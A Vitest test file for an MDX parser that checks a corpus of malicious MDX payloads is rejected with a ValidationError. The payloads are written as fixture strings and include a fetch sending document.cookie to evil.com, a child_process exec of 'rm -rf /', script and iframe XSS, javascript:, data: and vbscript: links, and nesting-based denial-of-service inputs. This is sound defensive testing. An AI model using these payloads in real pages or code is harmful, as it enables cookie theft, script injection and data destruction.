import { describe, expect, it } from "vitest";
import { ValidationError } from "../../shared/errors.js";
import { callout, code, image, paragraph } from "../block-registry.js";
import { parseMdxToBlocks } from "../parse.js";

/**
 * Permanent malicious-MDX fixture corpus. Every crafted payload here must
 * be rejected with a ValidationError — never silently accepted, never a
 * different error type, never a crash. Any real-world bypass found in the
 * future gets a new case added here, not just a fix.
 */
const registry = {
  paragraph: paragraph(),
  image: image(),
  callout: callout({ tones: ["info", "warning", "danger"] }),
};

const maliciousFixtures: Record<string, string> = {
  "import smuggling": 'import Evil from "evil-package"\n\nSome text.',
  "export smuggling": 'export const x = fetch("http://evil.com")\n\nSome text.',
  "export function smuggling": "export function evil() { return globalThis.process.exit(1) }\n\nText.",
  "flow expression injection": '{fetch("http://evil.com/exfiltrate?data=" + document.cookie)}',
  "text expression injection": "Some text {globalThis.process.mainModule.require('child_process').exec('rm -rf /')} more text.",
  "unknown tag: script": "<script>alert(document.cookie)</script>",
  "unknown tag: iframe": '<iframe src="javascript:alert(1)"></iframe>',
  "unknown tag: unregistered component": '<UnregisteredComponent foo="bar" />',
  "unknown tag: lowercase html passthrough": "<div onClick={alert(1)}>click me</div>",
  "jsx attribute expression injection": '<Image src={fetch("http://evil.com").then(r=>r.text())} alt="x" />',
  "jsx spread attribute injection": "<Image {...maliciousProps} />",
  "jsx spread attribute on registered tag": "<Callout {...{tone: 'info', dangerouslySetInnerHTML: {__html: '<script>1</script>'}}} />",
  "nested expression inside a registered block's children": '<Callout tone="info">{fetch("http://evil.com")}</Callout>',
  "nested unknown JSX inside a registered block's children": '<Callout tone="info"><script>alert(1)</script></Callout>',
  "fragment with expression child": "<>{globalThis}</>",
  "expression disguised as attribute value with extra braces": '<Image src={"safe" + fetch("evil.com")} alt="x" />',
  "esm smuggled after valid content": 'Some safe text.\n\nimport Evil from "evil-package"',
  "javascript: URL in a hand-edited markdown link": "Click [here](javascript:alert(document.cookie)) now.",
  "data: URL in a hand-edited markdown link": "Click [here](data:text/html,<script>alert(1)</script>) now.",
  "vbscript: URL in a hand-edited markdown link": "Click [here](vbscript:msgbox(1)) now.",
};

describe("assertSafeMdxTree / parseMdxToBlocks — malicious MDX fixture corpus", () => {
  it.each(Object.entries(maliciousFixtures))("rejects: %s", (_name, source) => {
    expect(() => parseMdxToBlocks(source, registry)).toThrow(ValidationError);
  });

  it("sanity control: a normal https: markdown link is inert and must NOT be rejected", () => {
    const result = parseMdxToBlocks("Check [this out](https://example.com/page).", registry);
    expect(result[0]?.props).toEqual({
      content: [
        { type: "text", text: "Check " },
        { type: "link", href: "https://example.com/page", children: [{ type: "text", text: "this out" }] },
        { type: "text", text: "." },
      ],
    });
  });

  it("sanity control: fenced code content is inert text, never parsed as MDX/JS (must NOT be rejected)", () => {
    // Not an attack — documents the boundary so a future regression that
    // starts treating code-fence contents as executable gets caught here.
    const registryWithCode = { ...registry, code: code() };
    const source = "```js\nfetch('evil.com')\n```";
    const result = parseMdxToBlocks(source, registryWithCode);
    expect(result).toEqual([{ type: "code", id: expect.any(String), props: { code: "fetch('evil.com')", language: "js" } }]);
  });

  it("rejects a document that mixes safe and unsafe content (fail closed on the whole document)", () => {
    const mixed = 'This paragraph is fine.\n\n<Callout tone="info">Also fine.</Callout>\n\n{evil()}';
    expect(() => parseMdxToBlocks(mixed, registry)).toThrow(ValidationError);
  });

  it("rejects deeply nested content instead of crashing with an uncaught stack overflow", () => {
    const deep = ">".repeat(20_000) + " text";
    expect(() => parseMdxToBlocks(deep, registry)).toThrow(ValidationError);
  });

  it("rejects an oversized flat document gracefully (many top-level unrecognized nodes, not just deep ones)", () => {
    // Blockquotes aren't a registered block type in this registry, so
    // every one of these (5000 separate, non-nested, top-level nodes)
    // should fail structural mapping — this exercises the "many nodes,
    // not deep nodes" DoS shape, independent of the recursion-depth guard
    // exercised above.
    const manyBlockquotes = Array.from({ length: 5000 }, (_, i) => `> quote ${i}`).join("\n\n");
    expect(() => parseMdxToBlocks(manyBlockquotes, registry)).toThrow(ValidationError);
  });
});
